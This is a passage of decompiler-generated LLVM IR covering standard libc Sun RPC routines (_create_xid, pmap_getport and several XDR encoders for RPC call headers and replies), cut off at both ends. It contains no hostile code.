  uselistorder i32 %v2_10022c48, { 1, 0, 2 }
  uselistorder i32 %v1_10022a94, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 34, 32, 33, 14, 15, 16, 17, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 19, 20, 31, 0 }
  uselistorder i32* %r3.global-to-local, { 32, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 0, 27, 1 }
  uselistorder i32* %r24.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r22.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r20.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r18.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8192, { 1, 0, 2, 3 }
  uselistorder i32 -983040, { 1, 0 }
  uselistorder i32 1000000, { 2, 0, 1, 3, 4 }
  uselistorder i32 8800, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 88, { 2, 3, 4, 5, 11, 12, 1, 13, 10, 6, 7, 8, 9, 0 }
  uselistorder i32 1000, { 2, 0, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder label %dec_label_pc_10022d20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10022d1c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10022cc4, { 1, 0 }
  uselistorder label %dec_label_pc_10022bd0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10022a78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10022a70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10022a5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10022a08, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_100229e8, { 1, 0 }
  uselistorder label %dec_label_pc_100229b4, { 1, 0 }
  uselistorder label %dec_label_pc_10022950, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10022920, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10022820, { 1, 0 }
  uselistorder label %dec_label_pc_1002280c, { 1, 0 }
  uselistorder label %dec_label_pc_10022804, { 1, 0 }
}

define i32 @_create_xid(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v2_10022d50 = ptrtoint i32* %stack_var_-44 to i32
  %v4_10022d64 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004db18.1300 to i32))
  store i32 268697600, i32* @r29, align 4
  store i32 268578164, i32* @lr, align 4
  %v1_10022d70 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004db18.1300 to i32))
  %v3_10022d74 = load i32, i32* @global_var_1004526c.1301, align 4
  %v3_10022d80 = icmp eq i32 %v3_10022d74, 0
  br i1 %v3_10022d80, label %dec_label_pc_10022d88, label %dec_label_pc_10022dac

dec_label_pc_10022d88:                            ; preds = %entry
  %v2_10022d7c = ptrtoint i32* %stack_var_-52 to i32
  store i32 268578188, i32* @lr, align 4
  %v2_10022d88 = call i32 @gettimeofday(i32 %v2_10022d7c, i32 0)
  %v3_10022d8c = load i32, i32* %stack_var_-52, align 4
  %v2_10022d9c = xor i32 %v3_10022d8c, %tmp
  %v2_10022da0 = trunc i32 %v2_10022d9c to i16
  %v3_10022da0 = call i32 @__GI_srand48_r(i16 %v2_10022da0, i32 ptrtoint (i32* @global_var_1004db30.1302 to i32))
  store i32 1, i32* @global_var_1004526c.1301, align 4
  br label %dec_label_pc_10022dac

dec_label_pc_10022dac:                            ; preds = %entry, %dec_label_pc_10022d88
  %v2_10022db0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268578236, i32* @lr, align 4
  %v2_10022db8 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_1004db30.1302 to i32), i32 %v2_10022db0)
  store i32 %v2_10022d50, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268578248, i32* @lr, align 4
  %v0_10022dc4 = call i32 @__pthread_cleanup_pop_restore()
  %v3_10022dcc = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10022dcc

; uselistorder directives
  uselistorder label %dec_label_pc_10022dac, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i16, align 2
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 400, i32* @r8, align 4
  %v3_10022e00 = add i32 %arg1, 2
  %v4_10022e00 = inttoptr i32 %v3_10022e00 to i16*
  store i16 111, i16* %v4_10022e00, align 2
  %v2_10022e14 = ptrtoint i32* %stack_var_-40 to i32
  store i16 0, i16* %stack_var_-72, align 2
  store i32 %v2_10022e14, i32* @r6, align 4
  %v2_10022e34 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10022e34, i32* @r7, align 4
  store i32 400, i32* @r9, align 4
  store i32 %arg1, i32* @r26, align 4
  store i32 -1, i32* %stack_var_-68, align 4
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268578388, i32* @lr, align 4
  %v6_10022e50 = call i32 @__GI_clntudp_bufcreate(i32 100000, i32 2, i32 %v2_10022e14)
  store i32 %v6_10022e50, i32* %r3.global-to-local, align 4
  store i32 %v6_10022e50, i32* @r31, align 4
  %v3_10022e54 = icmp eq i32 %v6_10022e50, 0
  br i1 %v3_10022e54, label %dec_label_pc_10022f18, label %dec_label_pc_10022e5c

dec_label_pc_10022e5c:                            ; preds = %entry
  store i32 268578400, i32* @lr, align 4
  %v0_10022e5c = call i32 @__GI___rpc_thread_createerr()
  store i32 0, i32* @r10, align 4
  store i32 %v0_10022e5c, i32* @r30, align 4
  store i32 60, i32* %stack_var_-40, align 4
  %v2_10022eac = ptrtoint i16* %stack_var_-72 to i32
  store i32 %v2_10022eac, i32* @r8, align 4
  %v0_10022eb0 = load i32, i32* @r31, align 4
  store i32 %v0_10022eb0, i32* %r3.global-to-local, align 4
  %v1_10022eb4 = add i32 %v0_10022eb0, 4
  %v2_10022eb4 = inttoptr i32 %v1_10022eb4 to i32*
  %v3_10022eb4 = load i32, i32* %v2_10022eb4, align 4
  %v1_10022eb8 = inttoptr i32 %v3_10022eb4 to i32*
  %v2_10022eb8 = load i32, i32* %v1_10022eb8, align 4
  call void @__pseudo_call(i32 %v2_10022eb8)
  %v0_10022ec4 = load i32, i32* @r30, align 4
  %v0_10022ec8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10022ec8 = icmp eq i32 %v0_10022ec8, 0
  %v0_10022ecc = load i32, i32* @r31, align 4
  store i32 %v0_10022ecc, i32* %r3.global-to-local, align 4
  br i1 %v3_10022ec8, label %dec_label_pc_10022ef0, label %dec_label_pc_10022ed4

dec_label_pc_10022ed4:                            ; preds = %dec_label_pc_10022e5c
  %v2_10022ed8 = inttoptr i32 %v0_10022ec4 to i32*
  store i32 14, i32* %v2_10022ed8, align 4
  %v0_10022edc = load i32, i32* @r31, align 4
  %v1_10022edc = add i32 %v0_10022edc, 4
  %v2_10022edc = inttoptr i32 %v1_10022edc to i32*
  %v3_10022edc = load i32, i32* %v2_10022edc, align 4
  %v1_10022ee0 = add i32 %v3_10022edc, 8
  %v2_10022ee0 = inttoptr i32 %v1_10022ee0 to i32*
  %v3_10022ee0 = load i32, i32* %v2_10022ee0, align 4
  call void @__pseudo_call(i32 %v3_10022ee0)
  br label %dec_label_pc_10022f04

dec_label_pc_10022ef0:                            ; preds = %dec_label_pc_10022e5c
  %v3_10022ef0 = load i16, i16* %stack_var_-72, align 2
  %v3_10022ef4 = icmp eq i16 %v3_10022ef0, 0
  br i1 %v3_10022ef4, label %dec_label_pc_10022efc, label %dec_label_pc_10022f04

dec_label_pc_10022efc:                            ; preds = %dec_label_pc_10022ef0
  %v2_10022f00 = inttoptr i32 %v0_10022ec4 to i32*
  store i32 15, i32* %v2_10022f00, align 4
  br label %dec_label_pc_10022f04

dec_label_pc_10022f04:                            ; preds = %dec_label_pc_10022ef0, %dec_label_pc_10022ed4, %dec_label_pc_10022efc
  %v0_10022f04 = load i32, i32* @r31, align 4
  %v1_10022f04 = add i32 %v0_10022f04, 4
  %v2_10022f04 = inttoptr i32 %v1_10022f04 to i32*
  %v3_10022f04 = load i32, i32* %v2_10022f04, align 4
  store i32 %v0_10022f04, i32* %r3.global-to-local, align 4
  %v1_10022f0c = add i32 %v3_10022f04, 16
  %v2_10022f0c = inttoptr i32 %v1_10022f0c to i32*
  %v3_10022f0c = load i32, i32* %v2_10022f0c, align 4
  call void @__pseudo_call(i32 %v3_10022f0c)
  %v3_10022f1c.pre = load i16, i16* %stack_var_-72, align 2
  %phitmp = sext i16 %v3_10022f1c.pre to i32
  br label %dec_label_pc_10022f18

dec_label_pc_10022f18:                            ; preds = %entry, %dec_label_pc_10022f04
  %v3_10022f1c = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_10022f04 ]
  store i32 %v3_10022f1c, i32* %r3.global-to-local, align 4
  %v2_10022f20 = load i32, i32* @r26, align 4
  %v3_10022f20 = add i32 %v2_10022f20, 2
  %v4_10022f20 = inttoptr i32 %v3_10022f20 to i16*
  store i16 0, i16* %v4_10022f20, align 2
  ret i32 %v3_10022f1c

; uselistorder directives
  uselistorder i32 %v3_10022f1c, { 1, 0 }
  uselistorder i16* %stack_var_-72, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_10022f18, { 1, 0 }
  uselistorder label %dec_label_pc_10022f04, { 2, 0, 1 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10022f38 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 268578644, i32* @lr, align 4
  %v0_10022f50 = call i32 @xdr_u_long()
  %v0_10022f54 = load i32, i32* @r31, align 4
  %v1_10022f54 = add i32 %v0_10022f54, 4
  store i32 %v1_10022f54, i32* @r4, align 4
  %v3_10022f58 = icmp eq i32 %v0_10022f50, 0
  %v0_10022f5c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10022f5c, i32* @r3, align 4
  br i1 %v3_10022f58, label %dec_label_pc_10022fa0, label %dec_label_pc_10022f64

dec_label_pc_10022f64:                            ; preds = %entry
  store i32 268578664, i32* @lr, align 4
  %v0_10022f64 = call i32 @xdr_u_long()
  %v0_10022f68 = load i32, i32* @r31, align 4
  %v1_10022f68 = add i32 %v0_10022f68, 8
  store i32 %v1_10022f68, i32* @r4, align 4
  %v3_10022f6c = icmp eq i32 %v0_10022f64, 0
  %v0_10022f70 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10022f70, i32* @r3, align 4
  br i1 %v3_10022f6c, label %dec_label_pc_10022fa0, label %dec_label_pc_10022f78

dec_label_pc_10022f78:                            ; preds = %dec_label_pc_10022f64
  store i32 268578684, i32* @lr, align 4
  %v0_10022f78 = call i32 @xdr_u_long()
  %v0_10022f7c = load i32, i32* @r31, align 4
  %v1_10022f7c = add i32 %v0_10022f7c, 12
  store i32 %v1_10022f7c, i32* @r4, align 4
  %v3_10022f80 = icmp eq i32 %v0_10022f78, 0
  %v0_10022f84 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10022f84, i32* @r3, align 4
  br i1 %v3_10022f80, label %dec_label_pc_10022fa0, label %dec_label_pc_10022f8c

dec_label_pc_10022f8c:                            ; preds = %dec_label_pc_10022f78
  store i32 %v0_10022f38, i32* @lr, align 4
  %v0_10022f9c = call i32 @xdr_u_long()
  br label %dec_label_pc_10022fa0

dec_label_pc_10022fa0:                            ; preds = %dec_label_pc_10022f78, %dec_label_pc_10022f64, %entry, %dec_label_pc_10022f8c
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_10022fa0, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_10022fb8 = add i32 %arg1, 8
  %v2_10022fb8 = inttoptr i32 %v1_10022fb8 to i32*
  %v3_10022fb8 = load i32, i32* %v2_10022fb8, align 4
  store i32 %v3_10022fb8, i32* @r10, align 4
  %v3_10022fbc = icmp eq i32 %v3_10022fb8, 0
  br i1 %v3_10022fbc, label %dec_label_pc_10022fd0, label %dec_label_pc_10022fc4

dec_label_pc_10022fc4:                            ; preds = %entry
  %v3_10022fc4 = icmp eq i32 %v3_10022fb8, 1
  br i1 %v3_10022fc4, label %dec_label_pc_10023050, label %dec_label_pc_10023088

dec_label_pc_10022fd0:                            ; preds = %entry
  %v1_10022fd0 = add i32 %arg1, 24
  %v2_10022fd0 = inttoptr i32 %v1_10022fd0 to i32*
  %v3_10022fd0 = load i32, i32* %v2_10022fd0, align 4
  store i32 %v3_10022fd0, i32* %r11.global-to-local, align 4
  %v3_10022fd4 = icmp eq i32 %v3_10022fd0, 0
  br i1 %v3_10022fd4, label %dec_label_pc_10022fdc, label %dec_label_pc_10022fe4

dec_label_pc_10022fdc:                            ; preds = %dec_label_pc_10022fd0
  store i32 0, i32* %arg2, align 4
  ret i32 %arg1

dec_label_pc_10022fe4:                            ; preds = %dec_label_pc_10022fd0
  %v2_10022fe4 = icmp ugt i32 %v3_10022fd0, 5
  br i1 %v2_10022fe4, label %dec_label_pc_1002303c, label %dec_label_pc_10022fec

dec_label_pc_10022fec:                            ; preds = %dec_label_pc_10022fe4
  %v1_10022ff0 = mul i32 %v3_10022fd0, 4
  store i32 %v1_10022ff0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002fa54.1310 to i32), i32* %r9.global-to-local, align 4
  %v2_10022ff8 = add i32 %v1_10022ff0, ptrtoint (i32* @global_var_1002fa54.1310 to i32)
  %v3_10022ff8 = inttoptr i32 %v2_10022ff8 to i32*
  %v4_10022ff8 = load i32, i32* %v3_10022ff8, align 4
  %v2_10022ffc = add i32 %v4_10022ff8, ptrtoint (i32* @global_var_1002fa54.1310 to i32)
  store i32 %v2_10022ffc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10022ffc)
  br label %dec_label_pc_10023014

dec_label_pc_10023014:                            ; preds = %dec_label_pc_10023050, %dec_label_pc_10022fec
  %storemerge1 = phi i32 [ 8, %dec_label_pc_10022fec ], [ 7, %dec_label_pc_10023050 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 %storemerge1, i32* %arg2, align 4
  br label %dec_label_pc_10023098

dec_label_pc_1002303c:                            ; preds = %dec_label_pc_10022fe4
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10023040 = add i32 %tmp, 4
  %v3_10023040 = inttoptr i32 %v2_10023040 to i32*
  store i32 0, i32* %v3_10023040, align 4
  %v0_10023044 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10023044, i32* %arg2, align 4
  %v0_10023048 = load i32, i32* %r11.global-to-local, align 4
  %v2_10023048 = add i32 %tmp, 8
  %v3_10023048 = inttoptr i32 %v2_10023048 to i32*
  store i32 %v0_10023048, i32* %v3_10023048, align 4
  br label %dec_label_pc_10023098thread-pre-split

dec_label_pc_10023050:                            ; preds = %dec_label_pc_10022fc4
  %v1_10023050 = add i32 %arg1, 12
  %v2_10023050 = inttoptr i32 %v1_10023050 to i32*
  %v3_10023050 = load i32, i32* %v2_10023050, align 4
  store i32 %v3_10023050, i32* %r9.global-to-local, align 4
  %v3_10023054 = icmp eq i32 %v3_10023050, 1
  br i1 %v3_10023054, label %dec_label_pc_10023014, label %dec_label_pc_1002305c

dec_label_pc_1002305c:                            ; preds = %dec_label_pc_10023050
  %v3_1002305c = icmp eq i32 %v3_10023050, 6
  br i1 %v3_1002305c, label %dec_label_pc_10023064, label %dec_label_pc_10023074

dec_label_pc_10023064:                            ; preds = %dec_label_pc_1002305c
  store i32 6, i32* %arg2, align 4
  br label %dec_label_pc_10023098

dec_label_pc_10023074:                            ; preds = %dec_label_pc_1002305c
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10023078 = add i32 %tmp, 4
  %v3_10023078 = inttoptr i32 %v2_10023078 to i32*
  store i32 1, i32* %v3_10023078, align 4
  %v0_1002307c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1002307c, i32* %arg2, align 4
  %v0_10023080 = load i32, i32* %r9.global-to-local, align 4
  %v2_10023080 = add i32 %tmp, 8
  %v3_10023080 = inttoptr i32 %v2_10023080 to i32*
  store i32 %v0_10023080, i32* %v3_10023080, align 4
  br label %dec_label_pc_10023098thread-pre-split

dec_label_pc_10023088:                            ; preds = %dec_label_pc_10022fc4
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 16, i32* %arg2, align 4
  %v3_10023090 = load i32, i32* %v2_10022fb8, align 4
  store i32 %v3_10023090, i32* %r0.global-to-local, align 4
  %v2_10023094 = add i32 %tmp, 4
  %v3_10023094 = inttoptr i32 %v2_10023094 to i32*
  store i32 %v3_10023090, i32* %v3_10023094, align 4
  br label %dec_label_pc_10023098thread-pre-split

dec_label_pc_10023098thread-pre-split:            ; preds = %dec_label_pc_10023088, %dec_label_pc_1002303c, %dec_label_pc_10023074
  %v2_10023098.pr = load i32, i32* %arg2, align 4
  br label %dec_label_pc_10023098

dec_label_pc_10023098:                            ; preds = %dec_label_pc_10023098thread-pre-split, %dec_label_pc_10023014, %dec_label_pc_10023064
  %v0_100230ac = phi i32 [ %v2_10023098.pr, %dec_label_pc_10023098thread-pre-split ], [ %storemerge1, %dec_label_pc_10023014 ], [ 6, %dec_label_pc_10023064 ]
  store i32 %v0_100230ac, i32* %r0.global-to-local, align 4
  %v3_1002309c = icmp eq i32 %v0_100230ac, 7
  br i1 %v3_1002309c, label %dec_label_pc_100230c4, label %dec_label_pc_100230a4

dec_label_pc_100230a4:                            ; preds = %dec_label_pc_10023098
  %v3_100230a4 = icmp eq i32 %v0_100230ac, 9
  br i1 %v3_100230a4, label %dec_label_pc_100230d0, label %dec_label_pc_100230ac

dec_label_pc_100230ac:                            ; preds = %dec_label_pc_100230a4
  %v0_100230b0 = load i32, i32* @lr, align 4
  %v2_100230b0 = icmp ne i32 %v0_100230ac, 6
  call void @__pseudo_cond_branch(i1 %v2_100230b0, i32 %v0_100230b0)
  %v1_100230b4 = add i32 %arg1, 16
  %v2_100230b4 = inttoptr i32 %v1_100230b4 to i32*
  %v3_100230b4 = load i32, i32* %v2_100230b4, align 4
  store i32 %v3_100230b4, i32* %r0.global-to-local, align 4
  %v2_100230b8 = add i32 %tmp, 4
  %v3_100230b8 = inttoptr i32 %v2_100230b8 to i32*
  store i32 %v3_100230b4, i32* %v3_100230b8, align 4
  %v1_100230bc = add i32 %arg1, 20
  br label %dec_label_pc_100230dc

dec_label_pc_100230c4:                            ; preds = %dec_label_pc_10023098
  %v1_100230c4 = add i32 %arg1, 16
  %v2_100230c4 = inttoptr i32 %v1_100230c4 to i32*
  %v3_100230c4 = load i32, i32* %v2_100230c4, align 4
  store i32 %v3_100230c4, i32* %r0.global-to-local, align 4
  %v2_100230c8 = add i32 %tmp, 4
  %v3_100230c8 = inttoptr i32 %v2_100230c8 to i32*
  store i32 %v3_100230c4, i32* %v3_100230c8, align 4
  ret i32 %arg1

dec_label_pc_100230d0:                            ; preds = %dec_label_pc_100230a4
  %v1_100230d0 = add i32 %arg1, 28
  %v2_100230d0 = inttoptr i32 %v1_100230d0 to i32*
  %v3_100230d0 = load i32, i32* %v2_100230d0, align 4
  store i32 %v3_100230d0, i32* %r0.global-to-local, align 4
  %v2_100230d4 = add i32 %tmp, 4
  %v3_100230d4 = inttoptr i32 %v2_100230d4 to i32*
  store i32 %v3_100230d0, i32* %v3_100230d4, align 4
  %v1_100230d8 = add i32 %arg1, 32
  br label %dec_label_pc_100230dc

dec_label_pc_100230dc:                            ; preds = %dec_label_pc_100230ac, %dec_label_pc_100230d0
  %storemerge.in.in = phi i32 [ %v1_100230bc, %dec_label_pc_100230ac ], [ %v1_100230d8, %dec_label_pc_100230d0 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_100230dc = add i32 %tmp, 8
  %v3_100230dc = inttoptr i32 %v2_100230dc to i32*
  store i32 %storemerge, i32* %v3_100230dc, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v0_100230ac, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10022ff0, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 2, 8, 5, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 9, 10 }
  uselistorder i32* %arg2, { 0, 6, 5, 4, 2, 3, 1, 7 }
  uselistorder i32 %arg1, { 3, 6, 5, 1, 0, 4, 9, 8, 7, 2, 10 }
  uselistorder label %dec_label_pc_100230dc, { 1, 0 }
  uselistorder label %dec_label_pc_10023098, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10023098thread-pre-split, { 0, 2, 1 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_100230e4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_100230fc = add i32 %arg2, 4
  %v3_100230fc = inttoptr i32 %v2_100230fc to i32*
  store i32 0, i32* %v3_100230fc, align 4
  %v2_10023104 = add i32 %arg2, 8
  %v3_10023104 = inttoptr i32 %v2_10023104 to i32*
  store i32 2, i32* %v3_10023104, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1002310c = load i32, i32* %arg1, align 4
  %v3_10023110 = icmp eq i32 %v2_1002310c, 0
  br i1 %v3_10023110, label %dec_label_pc_10023118, label %dec_label_pc_1002317c

dec_label_pc_10023118:                            ; preds = %entry
  store i32 268579100, i32* @lr, align 4
  %v0_10023118 = call i32 @xdr_u_long()
  %v3_10023120 = icmp eq i32 %v0_10023118, 0
  %v0_10023124 = load i32, i32* @r31, align 4
  store i32 %v0_10023124, i32* @r3, align 4
  br i1 %v3_10023120, label %dec_label_pc_1002317c, label %dec_label_pc_1002312c

dec_label_pc_1002312c:                            ; preds = %dec_label_pc_10023118
  store i32 268579120, i32* @lr, align 4
  %v0_1002312c = call i32 @xdr_enum()
  %v0_10023130 = load i32, i32* @r30, align 4
  %v1_10023130 = add i32 %v0_10023130, 8
  store i32 %v1_10023130, i32* @r4, align 4
  %v3_10023134 = icmp eq i32 %v0_1002312c, 0
  %v0_10023138 = load i32, i32* @r31, align 4
  store i32 %v0_10023138, i32* @r3, align 4
  br i1 %v3_10023134, label %dec_label_pc_1002317c, label %dec_label_pc_10023140

dec_label_pc_10023140:                            ; preds = %dec_label_pc_1002312c
  store i32 268579140, i32* @lr, align 4
  %v0_10023140 = call i32 @xdr_u_long()
  %v0_10023144 = load i32, i32* @r30, align 4
  %v1_10023144 = add i32 %v0_10023144, 12
  store i32 %v1_10023144, i32* @r4, align 4
  %v3_10023148 = icmp eq i32 %v0_10023140, 0
  %v0_1002314c = load i32, i32* @r31, align 4
  store i32 %v0_1002314c, i32* @r3, align 4
  br i1 %v3_10023148, label %dec_label_pc_1002317c, label %dec_label_pc_10023154

dec_label_pc_10023154:                            ; preds = %dec_label_pc_10023140
  store i32 268579160, i32* @lr, align 4
  %v0_10023154 = call i32 @xdr_u_long()
  %v0_10023158 = load i32, i32* @r30, align 4
  %v1_10023158 = add i32 %v0_10023158, 16
  store i32 %v1_10023158, i32* @r4, align 4
  %v3_1002315c = icmp eq i32 %v0_10023154, 0
  %v0_10023160 = load i32, i32* @r31, align 4
  store i32 %v0_10023160, i32* @r3, align 4
  br i1 %v3_1002315c, label %dec_label_pc_1002317c, label %dec_label_pc_10023168

dec_label_pc_10023168:                            ; preds = %dec_label_pc_10023154
  store i32 %v0_100230e4, i32* @lr, align 4
  %v0_10023178 = call i32 @xdr_u_long()
  br label %dec_label_pc_1002317c

dec_label_pc_1002317c:                            ; preds = %entry, %dec_label_pc_10023154, %dec_label_pc_10023140, %dec_label_pc_1002312c, %dec_label_pc_10023118, %dec_label_pc_10023168
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1002317c, { 5, 1, 2, 3, 4, 0 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  %v0_10023194 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 268579248, i32* @lr, align 4
  %v0_100231ac = call i32 @xdr_enum()
  %v3_100231b0 = icmp eq i32 %v0_100231ac, 0
  br i1 %v3_100231b0, label %dec_label_pc_1002321c, label %dec_label_pc_100231b8

dec_label_pc_100231b8:                            ; preds = %entry
  %v0_100231b8 = load i32, i32* @r31, align 4
  %v1_100231b8 = inttoptr i32 %v0_100231b8 to i32*
  %v2_100231b8 = load i32, i32* %v1_100231b8, align 4
  %v1_100231bc = add i32 %v0_100231b8, 4
  store i32 %v1_100231bc, i32* @r4, align 4
  %v0_100231c0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100231c0, i32* @r3, align 4
  %v3_100231c4 = icmp eq i32 %v2_100231b8, 0
  br i1 %v3_100231c4, label %dec_label_pc_100231d8, label %dec_label_pc_100231d0

dec_label_pc_100231d0:                            ; preds = %dec_label_pc_100231b8
  %v3_100231c8 = icmp eq i32 %v2_100231b8, 1
  br i1 %v3_100231c8, label %dec_label_pc_10023200, label %dec_label_pc_1002321c

dec_label_pc_100231d8:                            ; preds = %dec_label_pc_100231b8
  store i32 268579292, i32* @lr, align 4
  %v0_100231d8 = call i32 @xdr_u_long()
  %v0_100231dc = load i32, i32* @r31, align 4
  %v1_100231dc = add i32 %v0_100231dc, 8
  store i32 %v1_100231dc, i32* @r4, align 4
  %v3_100231e0 = icmp eq i32 %v0_100231d8, 0
  %v0_100231e4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100231e4, i32* @r3, align 4
  br i1 %v3_100231e0, label %dec_label_pc_1002321c, label %dec_label_pc_100231ec

dec_label_pc_100231ec:                            ; preds = %dec_label_pc_100231d8
  store i32 %v0_10023194, i32* @lr, align 4
  %v0_100231fc = call i32 @xdr_u_long()
  %v0_10023204.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10023200

dec_label_pc_10023200:                            ; preds = %dec_label_pc_100231d0, %dec_label_pc_100231ec
  %v0_10023204 = phi i32 [ %v0_100231c0, %dec_label_pc_100231d0 ], [ %v0_10023204.pre, %dec_label_pc_100231ec ]
  store i32 %v0_10023204, i32* @r3, align 4
  store i32 %v0_10023194, i32* @lr, align 4
  %v0_10023218 = call i32 @xdr_enum()
  br label %dec_label_pc_1002321c

dec_label_pc_1002321c:                            ; preds = %dec_label_pc_100231d0, %dec_label_pc_100231d8, %entry, %dec_label_pc_10023200
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10023194, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1002321c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10023200, { 1, 0 }
}

define i32 @__GI_xdr_replymsg(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10023234 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268579408, i32* @lr, align 4
  %v0_1002324c = call i32 @xdr_u_long()
  %v3_10023254 = icmp eq i32 %v0_1002324c, 0
  %v0_10023258 = load i32, i32* @r30, align 4
  store i32 %v0_10023258, i32* @r3, align 4
  br i1 %v3_10023254, label %dec_label_pc_100232a4, label %dec_label_pc_10023260

dec_label_pc_10023260:                            ; preds = %entry
  store i32 268579428, i32* @lr, align 4
  %v0_10023260 = call i32 @xdr_enum()
